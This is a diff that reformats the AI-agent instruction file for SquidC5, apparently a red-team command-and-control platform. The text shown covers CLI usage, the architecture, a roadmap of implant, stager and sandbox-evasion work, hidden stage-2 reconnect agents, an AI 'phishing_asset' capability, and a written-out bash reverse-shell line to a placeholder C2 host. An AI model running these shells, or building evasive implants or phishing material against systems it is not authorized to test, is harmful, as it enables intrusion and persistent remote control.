@@ -1,8 +1,8 @@
-# AGENTS.md — Instructions for AI Agents Working on SquidC5
+# AGENTS.md - Instructions for AI Agents Working on SquidC5
 
 ## Classification & Mission
 
-**SquidC5 is a military-grade, security-first, AI-native C5 platform** — **Command • Control • Cognitive • Collaborative • Coordination** — under active development for **authorized** red team, penetration testing, and defensive security operations only.
+**SquidC5 is a military-grade, security-first, AI-native C5 platform** - **Command - Control - Cognitive - Collaborative - Coordination** - under active development for **authorized** red team, penetration testing, and defensive security operations only.
 
 Treat every change as if the system will be deployed in high-threat environments:
 
@@ -15,8 +15,8 @@ Unauthorized access assistance is out of scope. Do not help with illegal use.
 
 ## Project Stack
 
-Primary language: Python 3.11+ · FastAPI · SQLite · Docker-first  
-Operator CLI: `sc5` (also `squidc5-cli`)  
+Primary language: Python 3.11+ - FastAPI - SQLite - Docker-first 
+Operator CLI: `sc5` (also `squidc5-cli`) 
 Ops UI: `/ops` (admin UI loaded only after server-side admin token check)
 
 ## Non-Negotiable Security Rules
@@ -27,7 +27,7 @@ Ops UI: `/ops` (admin UI loaded only after server-side admin token check)
 4. **Determinism preference**: Templates, fixed prompts, single-step tools over free-form agentic planning.
 5. **Audit everything**: Operator, MCP, Admin AI, feature toggles, and admin UI loads go through the policy engine / audit trail.
 6. **No secrets in git**: Tokens, API keys, `data/`, `admin_token.txt`, `~/.config/squidc5/config.json` stay out of the repository.
-7. **Port flexibility**: Never hard-require ports 80 or 443 — operators *may* use them.
+7. **Port flexibility**: Never hard-require ports 80 or 443 - operators *may* use them.
 8. **Admin UI isolation**: Admin-only HTML/JS must be served only after server validates an **admin** token (`/api/v1/ops/admin.js`). Non-admin clients must never receive admin control code.
 9. **Public docs locked off**: `/docs`, `/redoc`, `/openapi.json` stay disabled. Feature flag `public_docs` is hard-forced `false`.
 10. **Authorized use only**.
@@ -50,28 +50,28 @@ When adding features: **deny by default**, enable via admin feature flags or env
 
 ## Development pipeline (mandatory)
 
-Source of truth also: Windows SquidSec workspace  
-`/mnt/c/Users/ynot_/OneDrive/Desktop/Company Data/SquidSec/AGENTS.md` + `knowledge-base/MEMORY.md`  
-→ **Development cycles (git repos)**.
+Source of truth also: Windows SquidSec workspace 
+`/mnt/c/Users/ynot_/OneDrive/Desktop/Company Data/SquidSec/AGENTS.md` + `knowledge-base/MEMORY.md` 
+-> **Development cycles (git repos)**.
 
 ### Git cycle (every change)
 
-1. **Update main/master** — pull latest  
-2. **Feature branch** — name for the change  
-3. **Unit tests first** — describe expected behavior  
-4. **Implement** code  
-5. **Red-green-refactor** — all tests pass; clean up  
-6. **Push branch** (never direct to main)  
-7. **Open PR**  
-8. **Wait for CI** — do not merge red  
-9. **Merge** when green  
-10. **Next change** — back to step 1  
+1. **Update main/master** - pull latest 
+2. **Feature branch** - name for the change 
+3. **Unit tests first** - describe expected behavior 
+4. **Implement** code 
+5. **Red-green-refactor** - all tests pass; clean up 
+6. **Push branch** (never direct to main) 
+7. **Open PR** 
+8. **Wait for CI** - do not merge red 
+9. **Merge** when green 
+10. **Next change** - back to step 1 
 
 ### Prod after merge
 
 ```text
-merge main → CI builds Linux/Windows binaries → GitHub Release published
-  → deploy Linux squidc5 binary ONLY (from Release assets or workflow Artifacts)
+merge main -> CI builds Linux/Windows binaries -> GitHub Release published
+ -> deploy Linux squidc5 binary ONLY (from Release assets or workflow Artifacts)
 ```
 
 Releases: `https://github.com/DotNetRussell/SquidC5/releases` (created by CI job `github-release` on main/master only).
@@ -82,13 +82,13 @@ Releases: `https://github.com/DotNetRussell/SquidC5/releases` (created by CI job
 - Docker is for **local/lab** only once binary prod path is active
 - Full policy: see **Production deploy policy** under Deployment Knowledge
 
-## Roadmap 2026–2027 (next work — prioritized)
+## Roadmap 2026-2027 (next work - prioritized)
 
 Full detail: `docs/roadmap-2026-2027.md`. Agents plan work against this list; stay OPSEC-first, agents-on-rails.
 
 | # | Focus | Notes |
 |---|--------|--------|
-| **1** | **Malleable / adaptive C2 profiles** | **TOP PRIORITY** — HTTP/S, DNS, WS; jitter; decoy; runtime switch |
+| **1** | **Malleable / adaptive C2 profiles** | **TOP PRIORITY** - HTTP/S, DNS, WS; jitter; decoy; runtime switch |
 | 2 | Advanced implant / beacon framework | Stagers, injection, memory-only, BOF-like; Win/Linux/macOS |
 | 3 | Evasion & anti-analysis | Sandbox/VM/debugger resistance; fronting/CDN; QUIC/WebTransport candidates |
 | 4 | Multi-operator collaboration | Teams, chat, handoff, spectator; per-operator audit |
@@ -105,29 +105,29 @@ Full detail: `docs/roadmap-2026-2027.md`. Agents plan work against this list; st
 
 ```
 src/squidc5/
-  main.py           # FastAPI app + lifespan + security headers (no public docs)
-  config.py         # Settings (SQUIDC5_* env) — secure defaults
-  features.py       # Runtime feature flags (admin-toggleable; public_docs locked)
-  cli.py            # Operator CLI (sc5)
-  db/store.py       # SQLite schema + access
-  auth/tokens.py    # Scoped tokens
-  policy/engine.py  # Allow/deny, risk, HITL
-  sessions/         # Beacon & shell sessions (orphan reap + verified shells)
-  listeners/        # http/tcp/reverse_shell + stage-2 + exec probe
-  shells/           # classify (false shells) + stabilize (stage-2)
-  tasking/          # Structured tasks
-  payloads/         # Deterministic templates
-  mcp/server.py     # Restricted external AI tools
-  ai/admin_ai.py    # Sandboxed internal AI (BYO LLM, e.g. xAI Grok)
-  api/routes.py     # REST API + /ops/admin.js gate + /features
-  metrics/          # Counters + SSE events
-  audit/            # Audit facade
+ main.py # FastAPI app + lifespan + security headers (no public docs)
+ config.py # Settings (SQUIDC5_* env) - secure defaults
+ features.py # Runtime feature flags (admin-toggleable; public_docs locked)
+ cli.py # Operator CLI (sc5)
+ db/store.py # SQLite schema + access
+ auth/tokens.py # Scoped tokens
+ policy/engine.py # Allow/deny, risk, HITL
+ sessions/ # Beacon & shell sessions (orphan reap + verified shells)
+ listeners/ # http/tcp/reverse_shell + stage-2 + exec probe
+ shells/ # classify (false shells) + stabilize (stage-2)
+ tasking/ # Structured tasks
+ payloads/ # Deterministic templates
+ mcp/server.py # Restricted external AI tools
+ ai/admin_ai.py # Sandboxed internal AI (BYO LLM, e.g. xAI Grok)
+ api/routes.py # REST API + /ops/admin.js gate + /features
+ metrics/ # Counters + SSE events
+ audit/ # Audit facade
 web/
-  phone-dashboard.html   # Public ops shell (no admin code)
-  ops-admin.js           # Admin-only module (served after admin auth)
+ phone-dashboard.html # Public ops shell (no admin code)
+ ops-admin.js # Admin-only module (served after admin auth)
 ```
 
-## Operator CLI (`sc5`) — Agent Knowledge
+## Operator CLI (`sc5`) - Agent Knowledge
 
 Entry points (after `pip install -e .`):
 
@@ -161,7 +161,7 @@ sc5 listeners list
 sc5 listeners create <name> <port> [--kind http|tcp|reverse_shell|dns|smtp] [--host 0.0.0.0] [--zone ZONE]
 sc5 listeners start|stop|delete <id>
 
-sc5 --insecure ...                  # skip TLS verify (self-signed teamserver)
+sc5 --insecure ... # skip TLS verify (self-signed teamserver)
 sc5 oast token create [--note "..."]
 sc5 oast tokens list
 sc5 oast hits --token T [--protocol dns|http|smtp]
@@ -172,7 +172,7 @@ sc5 payloads generate <template> <host> <port> [--interval 5] [--raw]
 # templates: http_beacon_python | http_beacon_bash | reverse_shell_bash | reverse_shell_python
 
 sc5 shell <session_id> <command...> [--wait N] [--json]
-sc5 shell all <command...>          # broadcast to verified shells only
+sc5 shell all <command...> # broadcast to verified shells only
 sc5 shell --all <command...>
 sc5 output <session_id>
 
@@ -181,7 +181,7 @@ sc5 tokens create <name> --scopes "a,b,c" [--mcp-tools "t1,t2"]
 sc5 tokens revoke <id>
 
 sc5 ai <capability> [--data "..."] [--llm <id>]
-# capabilities: payload_template | phishing_asset | doc_generate | shell_classify | recon_assist | …
+# capabilities: payload_template | phishing_asset | doc_generate | shell_classify | recon_assist | ...
 # Ops UI INKO chat uses POST /api/v1/ai/chat (multi-turn + railed tools); CLI remains capability-oriented
 
 sc5 llm list
@@ -198,35 +198,35 @@ sc5 backup [path] [--data-dir DIR]
 sc5 restore <backup.db> [--data-dir DIR]
 
 # File ops / SOCKS (API; CLI via tasks or REST)
-# POST /api/v1/files/op  {session_id, op:list|read|write|delete, path, ...}
+# POST /api/v1/files/op {session_id, op:list|read|write|delete, path, ...}
 # POST /api/v1/pivot/socks {session_id, listen_host, listen_port}
 ```
 
 ### Sessions defaults
 
-- `sc5 sessions list` → **active + live + verified reverse shells** (and active beacons when not `--shells`)
+- `sc5 sessions list` -> **active + live + verified reverse shells** (and active beacons when not `--shells`)
 - Dead / echo-only shells are reaped (TCP gone or fail exec probe)
 - Prefer `verified: true` before operator shell interaction
 
 ### Reverse-shell operator flow
 
 1. `sc5 listeners create rev <port> --kind reverse_shell`
-2. `sc5 listeners start <id>` — must show `running`
+2. `sc5 listeners start <id>` - must show `running`
 3. On authorized target: `bash -i >& /dev/tcp/<C2_HOST>/<port> 0>&1`
-4. `sc5 sessions list --shells` → find `kind: reverse_shell` with `verified: true`
-5. `sc5 shell <session_id> "whoami"` — prints remote output
+4. `sc5 sessions list --shells` -> find `kind: reverse_shell` with `verified: true`
+5. `sc5 shell <session_id> "whoami"` - prints remote output
 6. Optional: `sc5 events` for `shell.connected` / `shell.output` / `shell.verified` / `session.rejected`
 
 ### Auto-stabilize + false-shell filter
 
 On capture, the server:
 
-1. **Classifies** inbound bytes (`shells/classify.py`) — drops TLS ClientHello, HTTP probes, binary noise (common on port 443). Rejected sessions are **deleted** (event: `session.rejected` / `shell.false_positive`).
+1. **Classifies** inbound bytes (`shells/classify.py`) - drops TLS ClientHello, HTTP probes, binary noise (common on port 443). Rejected sessions are **deleted** (event: `session.rejected` / `shell.false_positive`).
 2. **Probes OS** then injects stage-2:
-   - **Linux** → background reconnecting Python line-executor (`SC5_STABLE_LINUX`, supports `SC5_PING`)
-   - **Windows** → hidden PowerShell reconnect agent (`SC5_STABLE_WIN`)
+ - **Linux** -> background reconnecting Python line-executor (`SC5_STABLE_LINUX`, supports `SC5_PING`)
+ - **Windows** -> hidden PowerShell reconnect agent (`SC5_STABLE_WIN`)
 3. Stage-2 agents reconnect to `SQUIDC5_PUBLIC_HOST:<listener_port>` and are **not** re-staged (banner skip).
-4. **Exec probe** must pass or session is dropped (no more “live but mute” shells).
+4. **Exec probe** must pass or session is dropped (no more "live but mute" shells).
 5. TCP keepalive enabled; idle read timeouts no longer fake liveness.
 
 Config: `SQUIDC5_SHELL_AUTO_STABILIZE`, `SQUIDC5_PUBLIC_HOST`, `SQUIDC5_SHELL_STABILIZE_DELAY_SEC`, `SQUIDC5_SHELL_PROBE_WAIT_SEC`.
@@ -235,7 +235,7 @@ Beacon flow:
 
 1. Generate HTTP beacon payload pointing at `http://HOST:8443/api/v1/implant/beacon`
 2. Run payload on authorized target
-3. `sc5 sessions list` → `kind: beacon`
+3. `sc5 sessions list` -> `kind: beacon`
 4. `sc5 tasks create <session_id> "id"` then re-check `sc5 tasks get <task_id>`
 
 ## Dual AI Architecture
@@ -255,7 +255,7 @@ Beacon flow:
 - `sanitize_untrusted` on untrusted input; tool results sanitized before model re-entry
 - Offline fallbacks when no LLM configured (deterministic intents + capability offline JSON)
 - Ops UI: top-bar **INKO** opens right flyout (full-screen mobile); nav **INKO** page for workspace chat
-- Status: `GET /api/v1/ai/status` (+ `?debug=true`) — **never returns API keys**
+- Status: `GET /api/v1/ai/status` (+ `?debug=true`) - **never returns API keys**
 - Tool catalog: `GET /api/v1/ai/tools` (names/descriptions only)
 
 ## Deployment Knowledge (Docker)
@@ -277,7 +277,7 @@ echo "net.ipv4.ip_unprivileged_port_start=0" > /etc/sysctl.d/99-squidc5.conf
 
 ### Admin token bootstrap
 
-On first start: written once to `$SQUIDC5_DATA_DIR/admin_token.txt` — **never commit**.
+On first start: written once to `$SQUIDC5_DATA_DIR/admin_token.txt` - **never commit**.
 
 ```bash
 docker exec squidc5 cat /data/admin_token.txt
@@ -297,7 +297,7 @@ Prod is updated **only** with the **standalone `squidc5` executable** produced b
 6. Agent deploys **that binary only** to the droplet (replace process; keep `data/`)
 
 ```text
-PR → tests green → merge main → CI binaries → deploy squidc5 binary to prod
+PR -> tests green -> merge main -> CI binaries -> deploy squidc5 binary to prod
 ```
 
 **Forbidden on prod:**
@@ -314,27 +314,27 @@ PR → tests green → merge main → CI binaries → deploy squidc5 binary to p
 Example (after downloading main CI artifact):
 
 ```bash
-# from operator machine — ARTIFACT is linux squidc5 from main CI
+# from operator machine - ARTIFACT is linux squidc5 from main CI
 scp -i <key> squidc5 root@<droplet>:/opt/squidc5/bin/squidc5.new
 ssh -i <key> root@<droplet> '
-  set -e
-  systemctl stop squidc5 || pkill -x squidc5 || true
-  mv /opt/squidc5/bin/squidc5.new /opt/squidc5/bin/squidc5
-  chmod +x /opt/squidc5/bin/squidc5
-  systemctl start squidc5   # or: SQUIDC5_DATA_DIR=/opt/squidc5/data /opt/squidc5/bin/squidc5
+ set -e
+ systemctl stop squidc5 || pkill -x squidc5 || true
+ mv /opt/squidc5/bin/squidc5.new /opt/squidc5/bin/squidc5
+ chmod +x /opt/squidc5/bin/squidc5
+ systemctl start squidc5 # or: SQUIDC5_DATA_DIR=/opt/squidc5/data /opt/squidc5/bin/squidc5
 '
 ```
 
 Docker remains valid for **local/lab** use only, not the default prod path once binary deploy is active.
 
-Legacy source rsync + compose (lab only — **not prod**):
+Legacy source rsync + compose (lab only - **not prod**):
 
 ```bash
 rsync -az -e "ssh -i <key>" \
-  --exclude '.venv' --exclude 'data' --exclude '.git' \
-  ./ root@<droplet>:/opt/squidc5/
+ --exclude '.venv' --exclude 'data' --exclude '.git' \
+ ./ root@<droplet>:/opt/squidc5/
 ssh -i <key> root@<droplet> \
-  'cd /opt/squidc5 && docker compose up -d --build --force-recreate'
+ 'cd /opt/squidc5 && docker compose up -d --build --force-recreate'
 ```
 
 Also: `scripts/deploy_droplet.sh <ip>` (lab/Docker; not the prod binary path)
@@ -345,9 +345,9 @@ Also: `scripts/deploy_droplet.sh <ip>` (lab/Docker; not the prod binary path)
 
 - Tokens: `sc5_<urlsafe>`
 - Header: `Authorization: Bearer <token>` or `X-API-Token: <token>`
-- Scopes: `admin`, `sessions:read|write`, `tasks:read|write`, `listeners:read|write`,  
-  `payloads:generate`, `metrics:read`, `audit:read`, `shell:interact`, `ai:use`,  
-  `mcp:connect`, `tokens:manage`, `llm:manage`, `policy:manage`, …
+- Scopes: `admin`, `sessions:read|write`, `tasks:read|write`, `listeners:read|write`, 
+ `payloads:generate`, `metrics:read`, `audit:read`, `shell:interact`, `ai:use`, 
+ `mcp:connect`, `tokens:manage`, `llm:manage`, `policy:manage`, ...
 - External AI: `mcp:connect` + per-token `mcp_tools` allow-list
 - Feature toggles: `GET/PUT /api/v1/features` (admin)
 
@@ -378,16 +378,16 @@ docker exec squidc5 cat /data/admin_token.txt
 
 | File | Purpose |
 |------|---------|
-| `AGENTS.md` | **This file** — primary agent operating memory + full CLI surface |
+| `AGENTS.md` | **This file** - primary agent operating memory + full CLI surface |
 | `CLAUDE.md` | Pointer to AGENTS + docs |
-| `docs/README.md` | Docs index (Diátaxis map + Ops nav → guide links) |
-| `docs/user-guide.md` | Feature reference (What/Why/How/Example/See also) — GitHub only |
+| `docs/README.md` | Docs index (Diátaxis map + Ops nav -> guide links) |
+| `docs/user-guide.md` | Feature reference (What/Why/How/Example/See also) - GitHub only |
 | `docs/operator-runbook.md` | Day-2 procedures (Goal/Prereqs/Steps/Verify) |
 | `docs/deployment.md` | Lab Docker + OAST + TLS + binary prod |
 | `docs/squidc5-vision.md` | Product / security architecture |
 | `docs/threat-model.md` | Assets, boundaries, STRIDE |
 | `docs/roadmap-2026-2027.md` | Long-range priorities (10 focus areas) |
-| `docs/roadmap-five-star.md` | Pack A–E / implant maturity status |
+| `docs/roadmap-five-star.md` | Pack A-E / implant maturity status |
 | `docs/prod-readiness-plan.md` | Phased engineering checklist |
 | `README.md` | Public-facing quickstart |
 | `SECURITY.md` | Disclosure policy |
@@ -401,7 +401,7 @@ docker exec squidc5 cat /data/admin_token.txt
 ## When Changing Code
 
 - Keep changes small and auditable
-- **Preserve secure-by-default posture** — new endpoints require auth/scopes; no public API maps
+- **Preserve secure-by-default posture** - new endpoints require auth/scopes; no public API maps
 - Add/adjust pytest coverage for auth, policy, MCP allow-lists, AI sanitization, CLI, feature flags
 - Update `docs/squidc5-vision.md` if behavior/spec changes
 - Update this `AGENTS.md` when CLI surface, deploy model, security boundaries, or defaults change
